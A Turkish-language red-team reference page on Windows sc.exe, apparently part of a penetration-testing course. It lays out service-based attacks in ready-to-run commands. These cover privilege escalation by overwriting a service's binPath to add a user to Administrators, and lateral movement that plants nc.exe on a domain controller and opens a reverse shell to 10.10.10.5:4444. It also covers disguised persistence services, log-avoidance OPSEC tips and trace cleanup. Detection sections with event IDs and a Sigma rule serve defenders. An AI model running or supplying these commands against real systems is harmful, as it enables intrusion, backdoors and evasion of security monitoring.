# sc.exe

> **Kategori:** [2. WINDOWS YEREL KOMUT SATIRI VE LOLBINS (NATIVE WINDOWS & SYSINTERNALS)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Windows Hizmet Kontrol Yöneticisi (Service Control Manager - SCM) CLI aracı; yerel ve uzaktan servis oluşturma (`sc create`), yapılandırma manipülasyonu (`sc config binPath=`), durum sorgulama (`sc qc`) ve servis yönetimi (`sc start`/`sc delete`).

---

## 1. Genel Bakış ve Amaç

`sc.exe` (Service Controller), Windows NT'den bu yana tüm Windows işletim sistemlerinde varsayılan olarak (`C:\Windows\System32\sc.exe`) bulunan ve **Hizmet Kontrol Yöneticisi (Service Control Manager - SCM / `services.exe`)** ile komut satırından doğrudan iletişim kuran yerleşik yönetim aracıdır.

Active Directory sızma testlerinde ve Red Team operasyonlarında `sc.exe`, hem **Yerel Yetki Yükseltme (Local Privilege Escalation - LPE)** hem de **Yanal Hareket (Lateral Movement)** safhalarında kullanılan en kritik LOLBin araçlarından biridir:
1. **Yerel Yetki Yükseltme:** Zayıf servis izinlerine (Weak Service Permissions) sahip bir servisin yürütülebilir dosya yolunu (`binPath=`) `sc config` ile değiştirerek düşük yetkili bir kullanıcıdan doğrudan `NT AUTHORITY\SYSTEM` yetkisine sıçramak.
2. **Yanal Hareket (PsExec Mekanizması):** Uzak bir hedef makinede (`sc \\DC01 create ...`) SMB ve MSRPC üzerinden yeni bir servis oluşturup başlatarak (`sc \\DC01 start ...`) uzaktan kod çalıştırmak.

### Protokol ve Çalışma Prensibi

`sc.exe`, yerel ve uzaktan çalışırken Windows'un **MS-SCMR (Service Control Manager Remote Protocol)** standardını ve **MSRPC** (TCP 445 SMB Named Pipe: `\pipe\svcctl`) arayüzünü kullanır:

```
┌──────────────────────────────────────────────────────────────┐
│                    Saldırgan İstemcisi                       │
│                        [ sc.exe ]                            │
└──────────────────────────────┬───────────────────────────────┘
                               │
            Yerel: LPC / ALPC  │ Uzak: TCP 445 (SMB)
            OpenSCManagerW     │ TreeConnect: IPC$
            CreateServiceW     │ Named Pipe: \pipe\svcctl (RPC)
                               │
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                  Hizmet Kontrol Yöneticisi                   │
│                 [ services.exe / SCM Core ]                  │
│                                                              │
│  - HKLM\SYSTEM\CurrentControlSet\Services\<ServisAdı>        │
│  - ImagePath (binPath) Çalıştırma                            │
│  - Service Account Context (SYSTEM / NetworkService / vb.)   │
│  - Service Control Handshake                                 │
└──────────────────────────────┬───────────────────────────────┘
                               │
         (A) Servis Başlatma: SCM Süreci Yaratır
         Süreç Doğrudan SYSTEM Olarak Çalışır!
                               ▼
┌──────────────────────────────────────────────────────────────┐
│                    Çalıştırılan Yük (Payload)                │
│             cmd.exe /c "net user backdoor P@ss /add"         │
└──────────────────────────────────────────────────────────────┘
```

1. **SCM ve Kayıt Defteri Eşleşmesi:** SCM üzerinden oluşturulan veya değiştirilen her servis, doğrudan `HKLM\SYSTEM\CurrentControlSet\Services\<ServisAdı>` kayıt defteri dalında bir anahtara karşılık gelir. `binPath=` parametresi kayıt defterindeki `ImagePath` değerine, `start=` parametresi ise `Start` değerine yazılır.
2. **Uzak Servis Yönetimi:** `sc.exe \\HedefSunucu <komut>` çalıştırıldığında, istemci uzak makinenin `IPC$` paylaşımına bağlanır ve `svcctl` named pipe'ı üzerinden uzaktaki `services.exe` sürecine RPC komutları gönderir. Bu teknik, Impacket'in `psexec.py` ve Sysinternals `PsExec` araçlarının temel çekirdek mekanizmasıdır.
3. **Sözdizim Kuralı (Kritik Bayrak Boşluğu):** `sc.exe` komut satırı ayrıştırıcısı (parser) çok katı bir kurala sahiptir: Parametre adı ile değeri arasındaki eşittir işaretinden sonra **kesinlikle bir boşluk** bulunmalıdır (`binPath= "..."`, `start= auto`). Boşluk bırakılmazsa komut sözdizim hatası verir!

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Yanal Hareket (Manuel PsExec)** | Uzak sunucuda harici hiçbir zararlı yazılım çalıştırmadan yerel `sc` komutuyla SMB/RPC üzerinden servis tetikleme. |
| **Zayıf Servis İzinleri İstismarı** | Sıradan kullanıcıların yapılandırmasını değiştirebildiği servislerin `binPath` yolunu ezerek SYSTEM olma. |
| **Kalıcılık (Persistence)** | Makine yeniden başladığında otomatik çalışacak (`start= auto`) gizli bir Windows servisi kurma. |
| **Güvenlik Servislerini Durdurma** | EDR veya antivirüs ajanlarının servislerini durdurma (`sc stop`) veya devre dışı bırakma (`sc config start= disabled`). |
| **Unquoted Service Path İstismarı** | Boşluk içeren ve tırnak içine alınmamış servis yollarında DLL/EXE yerleştirerek yetki yükseltme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `sc.exe` | `net start / net stop` | `PowerShell (*-Service)` | `PsExec (Sysinternals)` |
|---|---|---|---|---|
| **Varsayılan Bulunabilirlik** | Tüm Windows sürümlerinde hazır | Tüm Windows'larda hazır | PowerShell olan yerlerde | Harici binary indirilmelidir |
| **Servis Oluşturma / Değiştirme** | Var (`create`, `config`) | Yok (Yalnızca başlat/durdur) | Var (`New-Service`) | Otomatik servis kurar ve siler |
| **Uzak Sistem Desteği** | Var (`sc \\hedef`) | Yok (Yalnızca yerel) | Var (`-ComputerName`) | Var (Otomatik RPC) |
| **Sözdizimi Kolaylığı** | Zor (Eşittir sonrası boşluk) | Çok Kolay | Orta | Çok Kolay |
| **EDR Algısı** | `binPath` değişikliği doğrudan izlenir | Düşük | Script Block Logging | Yüksek (PsExec servisi imzalıdır) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```cmd
sc [\\sunucu] <alt_komut> [servis_adı] [seçenekler]
```

> [!IMPORTANT]
> `sc` komutlarında tüm opsiyonel parametrelerde eşittir işaretinden (`=`) sonra **mutlaka bir karakter boşluk** bırakılmalıdır!
> Doğru: `binPath= C:\Temp\agent.exe`
> Yanlış: `binPath=C:\Temp\agent.exe`

### Alt Komutlar ve Kritik Bayraklar

| Alt Komut | Açıklama | Örnek Kullanım |
|---|---|---|
| `query [ad]` | Servislerin çalışma durumunu (RUNNING, STOPPED) listeler. | `sc query Spooler` |
| `queryex [ad]` | Servis durumuna ek olarak PID ve bayrakları döker. | `sc queryex LanmanServer` |
| `qc <ad>` | Servisin yapılandırmasını (`binPath`, başlangıç türü, hesap adı) döker. | `sc qc vuln_service` |
| `create <ad>` | Yeni bir servis tanımlar. | `sc create MySvc binPath= "C:\Temp\a.exe" start= auto` |
| `config <ad>` | Mevcut bir servisin yapılandırma parametrelerini günceller. | `sc config MySvc binPath= "cmd.exe /c ..."` |
| `start <ad>` | Belirtilen servisi çalıştırır. | `sc start MySvc` |
| `stop <ad>` | Çalışan bir servisi durdurur. | `sc stop MySvc` |
| `delete <ad>` | Belirtilen servisi SCM veritabanından ve kayıt defterinden siler. | `sc delete MySvc` |
| `sdshow <ad>` | Servisin güvenlik tanımlayıcısını (SDDL) görüntüler. | `sc sdshow MySvc` |
| `failure <ad>` | Servis çöktüğünde devreye girecek kurtarma eylemlerini yapılandırır. | `sc failure MySvc reset= 0 actions= run/1000` |

### `create` ve `config` İçin Kritik Parametreler

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `binPath= <yol>` | Servis başlatıldığında yürütülecek ikili dosya yolu veya komut dizisi. | `binPath= "C:\Windows\Temp\agent.exe"` |
| `start= <tür>` | Servis başlangıç türü: `boot`, `system`, `auto`, `demand` (manuel), `disabled`. | `start= auto` |
| `obj= <hesap>` | Servisin çalışacağı kullanıcı hesabı (Varsayılan: `LocalSystem`). | `obj= "NT AUTHORITY\SYSTEM"` |
| `password= <parola>` | Servis hesabı bir kullanıcıysa parolasını belirtir. | `password= "P@ss123!"` |
| `displayname= <ad>` | Windows Hizmetler konsolunda (`services.msc`) görünecek isim. | `displayname= "Windows Core Defender"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Zayıf Servis İzinlerini İstismar Ederek SYSTEM Yetkisine Yükselme (LPE)

Düşük yetkili bir kullanıcı sisteme sızdığında, izinleri gevşek bırakılmış bir 3. parti yazılım servisi tespit eder:

```cmd
:: 1. Servis konfigürasyonunu incele
sc qc VulnSoftwareService
```

**Örnek Çıktı Analizi:**
```text
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: VulnSoftwareService
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\VulnSoft\service.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Vulnerable Enterprise Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```
- `SERVICE_START_NAME: LocalSystem`: Bu servis başladığında en yüksek yerel yetki olan `SYSTEM` bağlamında çalışacaktır.

Saldırgan `AccessChk` veya `sc sdshow` ile servisin yapılandırma izinlerine (`SERVICE_CHANGE_CONFIG`) sahip olduğunu doğrular ve servis yolunu kendi komutuyla değiştirir:

```cmd
:: 2. binPath değerini saldırgan komutuyla güncelle
sc config VulnSoftwareService binPath= "cmd.exe /c net localgroup Administrators jdoe /add"

:: 3. Servisi yeniden başlat
sc stop VulnSoftwareService
sc start VulnSoftwareService
```
Servis yeniden başladığında `jdoe` kullanıcısı doğrudan yerel yöneticiler grubuna eklenir!

---

### Senaryo 2: Uzak Sistemde Servis Oluşturarak Yanal Hareket (Manuel PsExec)

Ele geçirilen bir etki alanı yöneticisi hesabı ile hedef etki alanı denetleyicisinde uzaktan kod çalıştırmak:

```cmd
:: 1. Payload dosyasını uzak hedefin C$ paylaşımına kopyala
copy C:\Windows\Temp\nc.exe \\DC01.lab.local\C$\Windows\Temp\nc.exe

:: 2. Uzak makinede yeni bir servis tanımla
sc \\DC01.lab.local create BackdoorSvc binPath= "C:\Windows\Temp\nc.exe 10.10.10.5 4444 -e cmd.exe" start= demand

:: 3. Servisi uzaktan tetikle
sc \\DC01.lab.local start BackdoorSvc
```

> [!NOTE]
> `sc start` komutu çalıştığında hedefte reverse shell açılır ancak konsolda şu hata görünebilir:
> `[SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion.`
> Bu durum bir hata değildir! Standart bir EXE dosyası SCM'ye "Servis Başarıyla Başladı" el sıkışması göndermediği için SCM 30 saniye sonra zaman aşımı üretir; ancak komut arka planda zaten başarıyla çalışmış ve bağlantı sağlanmıştır.

---

### Senaryo 3: Kalıcılık İçin Otomatik Başlayan Arka Kapı Servisi Kurma

Sistem açılışlarında çalışan ve dikkat çekmeyen meşru görünümlü bir servis oluşturmak:

```cmd
sc create WinDiagnosticUpdate binPath= "C:\Windows\System32\svchost_update.exe" start= auto displayname= "Windows Diagnostic Optimization Service"
```

---

### Senaryo 4: Hedef Servisin Durumunu ve PID Değerini Sorgulama

LSASS bellek dökümü öncesinde veya süreç analizi için hedef servisin PID değerini tespit etmek:

```cmd
sc queryex Spooler
```

**Örnek Çıktı:**
```text
SERVICE_NAME: Spooler 
        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1844
        FLAGS              : 
```

---

### Senaryo 5: Servis Güvenlik Tanımlayıcısını (SDDL) Okuma

Düşük yetkili bir kullanıcının servisi durdurup başlatma veya yapılandırma yetkisini analiz etmek:

```cmd
sc sdshow LanmanServer
```

---

### Senaryo 6: İz Temizliği — Oluşturulan Servisi Durdurma ve Silme

Operasyon bittiğinde adli iz bırakmamak için kurulan servisi sistemden kaldırmak:

```cmd
sc stop BackdoorSvc
sc delete BackdoorSvc
```

**Örnek Çıktı:**
```text
[SC] DeleteService SUCCESS
```

---

### Senaryo 7: PowerShell ile Değiştirilebilir Zayıf Servisleri Tarayan Betik

Sistemdeki tüm servisleri tarayıp `LocalSystem` olarak çalışan ve tırnak işareti içermeyen yolları listeleyen otomasyon betiği:

```powershell
# Unquoted Service Path ve zayıf servis avcısı:
Get-CimInstance Win32_Service | Where-Object { 
    $_.StartName -eq 'LocalSystem' -and 
    $_.PathName -notmatch '^"' -and 
    $_.PathName -match '\s' -and 
    $_.PathName -notmatch '(?i)^C:\\Windows\\' 
} | Select-Object Name, DisplayName, PathName, StartMode | Format-Table -AutoSize
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Neden | Çözüm Adımı |
|---|---|---|
| `[SC] OpenSCManager FAILED 5: Access is denied.` | Servis oluşturma, durdurma veya konfigürasyon değiştirme komutu için yerel yönetici (Local Admin) yetkisi yoktur. | Komut istemcisini "Run as Administrator" olarak açın veya UAC Bypass tekniklerini uygulayın. |
| `[SC] StartService FAILED 1053: The service did not respond...` | Çalıştırılan ikili dosya (örneğin nc.exe veya mimikatz) bir Windows Service Binary değildir; SCM API el sıkışması yapamaz. | Bu normal bir durumdur; payload zaten çalışmıştır. Eğer temiz bir servis isteniyorsa `ServiceMain` fonksiyonu içeren bir C/C++ ikili dosyası derleyin. |
| `[SC] CreateService FAILED 1073: The specified service already exists.` | Belirtilen adla zaten bir servis mevcuttur. | `sc delete <ad>` ile eski servisi silin veya yeni servise farklı bir isim verin. |
| `[SC] ControlService FAILED 1062: The service has not been started.` | Durdurulmak istenen servis zaten kapalı durumdadır. | Servisin durumunu `sc query <ad>` ile doğrulayın. |
| `DESCRIPTION: ... Invalid command syntax` | Eşittir (`=`) işaretinden sonra zorunlu boşluk bırakılmamıştır (`binPath="cmd"` yerine `binPath= "cmd"` yazılmalıdır). | Eşittir işaretlerinden sonra bir boşluk bırakarak sözdizimini düzeltin: `binPath= "C:\Temp\a.exe"`. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Windows Olay Günlükleri (Security & System Logs):**
  - **System Event ID 7045 (A service was installed in the system):** Sistemde yeni bir servis kurulduğunda (`sc create`) Servis Adı, Görüntü Yolu (`ImagePath`) ve Servis Türü ile birlikte kesin kanıt olarak kaydedilir. En çok izlenen olay kimliğidir!
  - **Security Event ID 4697 (A service was installed in the system):** Gelişmiş güvenlik denetimi açıksa Security günlüğüne kurulma anında kullanıcı kimliğiyle birlikte yazılır.
  - **System Event ID 7036 (The service entered the running/stopped state):** Servis başladığında veya durduğunda oluşur.
  - **Event ID 4688 / Sysmon Event ID 1 (Process Creation):** `sc.exe create` veya `sc.exe config binPath=` komut satırı argümanları kaydedilir.
- **Kayıt Defteri İzleri:**
  - `HKLM\SYSTEM\CurrentControlSet\Services\<ServisAdı>` altında anahtar ve değerler oluşur (Sysmon Event ID 12/13).

### 5.2 Ağ ve EDR İmzaları

- **MSRPC `\pipe\svcctl` Ağ Trafiği:** `sc \\hedef` kullanımı, ağ üzerinde açıkça görülebilen SMB ve RPC named pipe trafiği oluşturur. Zeek, Suricata ve NDR cihazları bu trafiği doğrudan **Remote Service Creation (T1021.002)** olarak raporlar.
- **Kritik EDR Davranış Kuralları:** `sc.exe` aracılığıyla `binPath=` parametresine `cmd.exe`, `powershell.exe`, `certutil.exe` veya `Temp/AppData` dizinindeki dosyaların atanması, tüm EDR sistemlerinde (CrowdStrike, Defender, SentinelOne) **Kritik Yetki Yükseltme Girişimi** olarak engellenir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1543.003** | Create or Modify System Process: Windows Service | Kalıcılık veya yetki yükseltme için yeni servis oluşturma (`sc create`). |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | Uzak sunucuda servis kurarak yanal hareket yapma (`sc \\hedef create`). |
| **T1569.002** | System Services: Service Execution | Hedef payload'u servis motoruyla çalıştırma (`sc start`). |
| **T1574.009** | Hijack Execution Flow: Unquoted Service Path | Tırnak içine alınmamış boşluklu servis yollarını istismar etme. |
| **T1070** | Indicator Removal on Host | Kullanılan servisi silerek adli izleri temizleme (`sc delete`). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **`sc create` (Event 7045) Tespiti** | Sıfırdan yeni servis oluşturmak yerine, sistemde mevcut olan ancak devre dışı bırakılmış (Disabled) meşru bir servisin `binPath`'ini geçici olarak güncelleyin ve işiniz bitince eski haline getirin. |
| **Komut Satırı Argümanı Tespiti** | `sc.exe` sürecini başlatmak yerine, doğrudan C# veya PowerShell ile `advapi32!CreateServiceW` / `ChangeServiceConfigW` Win32 API'lerini çağırın. |
| **1053 Hata Kodunu Önleme** | Payload'unuzu `ServiceBase` (.NET) veya C++ `SERVICE_TABLE_ENTRY` standardına uygun bir servis ikili dosyası olarak derleyin. |

### 5.5 Savunma Karşılığı (Blue Team)

- **Event 7045 ve 4697 Alarmları:** SIEM sistemlerinde `ImagePath` içinde `cmd.exe`, `powershell.exe`, `AppData`, `Temp` veya `Public` geçen yeni servis kurulumlarına anında yüksek önem dereceli alarm atayın.
- **Sigma Kuralı Mantığı:**
  ```yaml
  title: Suspicious Service Modification or Creation via SC.EXE
  status: high
  logsource:
      category: process_creation
      product: windows
  detection:
      selection:
          Image|endswith: '\sc.exe'
          CommandLine|contains|any:
              - 'binPath='
              - 'binpath='
          CommandLine|contains|any:
              - 'cmd.exe'
              - 'powershell'
              - 'AppData'
              - 'Temp\'
              - 'net user'
      condition: selection
  ```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

### 6.1 Yeni Bir Windows Servisi Oluşturma
```cmd
sc create CoreDefender binPath= "C:\Windows\Temp\agent.exe" start= auto
```
- **Ne Yapar?** Sistem başlangıcında otomatik çalışacak yeni bir servis tanımlar.
- **Ne Zaman Kullanılır?** Sistemde SYSTEM yetkisinde kalıcılık (persistence) sağlamak için.
- **Parametreler:** `create <Ad>` (Servis adı), `binPath= "..."` (İkili dosya yolu), `start= auto` (Otomatik başlama).

### 6.2 Mevcut Servisin Yürütme Yolunu Değiştirme (LPE)
```cmd
sc config VulnSvc binPath= "cmd.exe /c net localgroup Administrators jdoe /add"
```
- **Ne Yapar?** Belirtilen servisin çalıştıracağı ikili dosya yolunu saldırgan komutuyla ezer.
- **Ne Zaman Kullanılır?** Zayıf servis yapılandırması üzerinden yerel yetki yükseltmek için.
- **Parametreler:** `config <Ad>`, `binPath= "..."`.

### 6.3 Servisi Başlatma
```cmd
sc start CoreDefender
```
- **Ne Yapar?** Belirtilen servisin SCM tarafından başlatılmasını sağlar.
- **Ne Zaman Kullanılır?** Eklenen veya yapılandırılan payload'u devreye sokmak için.
- **Parametreler:** `start <Ad>`.

### 6.4 Servisi Durdurma
```cmd
sc stop CoreDefender
```
- **Ne Yapar?** Çalışmakta olan bir servisi sonlandırır.
- **Ne Zaman Kullanılır?** Servis konfigürasyonunu değiştirmeden önce veya iz temizliği sırasında.
- **Parametreler:** `stop <Ad>`.

### 6.5 Servisi Sistemden Tamamen Silme
```cmd
sc delete CoreDefender
```
- **Ne Yapar?** Servisi SCM veritabanından ve kayıt defterinden tamamen kaldırır.
- **Ne Zaman Kullanılır?** Operasyon bittiğinde sistemde geride servis izi bırakmamak için.
- **Parametreler:** `delete <Ad>`.

### 6.6 Servisin Yapılandırmasını ve Çalışan Kullanıcısını Sorgulama
```cmd
sc qc Spooler
```
- **Ne Yapar?** Servisin `binPath`, başlangıç modu ve çalıştığı hesap (`LocalSystem` vb.) bilgilerini gösterir.
- **Ne Zaman Kullanılır?** Servisin istismar edilmeye uygun olup olmadığını doğrulamak için.
- **Parametreler:** `qc <Ad>`.

### 6.7 Servisin Çalışma Durumunu ve PID Değerini Alma
```cmd
sc queryex LanmanServer
```
- **Ne Yapar?** Servisin o anki çalışma durumunu (RUNNING/STOPPED) ve süreç kimliğini (PID) döker.
- **Ne Zaman Kullanılır?** Süreç enjeksiyonu veya bellek dökümü öncesi hedef PID'yi öğrenmek için.
- **Parametreler:** `queryex <Ad>`.

### 6.8 Uzak Sunucuda Servis Başlatarak Yanal Hareket
```cmd
sc \\DC01.lab.local start RemoteBackdoor
```
- **Ne Yapar?** Ağ üzerindeki uzak makinede tanımlı bir servisi uzaktan tetikler.
- **Ne Zaman Kullanılır?** Uzak hedef makinede SYSTEM seviyesinde kod yürütmek için.
- **Parametreler:** `\\<HedefSunucu>`, `start <Ad>`.

### 6.9 Servisin Güvenlik Tanımlayıcısını (SDDL) Görüntüleme
```cmd
sc sdshow VulnSvc
```
- **Ne Yapar?** Servisin erişim denetim listesini (ACL) SDDL metin formatında döker.
- **Ne Zaman Kullanılır?** Kullanıcının servisi yeniden yapılandırma hakkı olup olmadığını anlamak için.
- **Parametreler:** `sdshow <Ad>`.

---

## Kaynaklar

| Kaynak | Bağlantı |
|---|---|
| Microsoft Learn — sc command reference | [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) |
| MS-SCMR: Service Control Manager Remote Protocol | [learn.microsoft.com](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/) |
| MITRE ATT&CK T1543.003 (Windows Service) | [attack.mitre.org](https://attack.mitre.org/techniques/T1543/003/) |
| LOLBAS Project — sc.exe | [lolbas-project.github.io](https://lolbas-project.github.io/) |

---

> **Önceki:** [← reg.exe](./reg.md) · **Sonraki:** [schtasks.exe →](./schtasks.md)
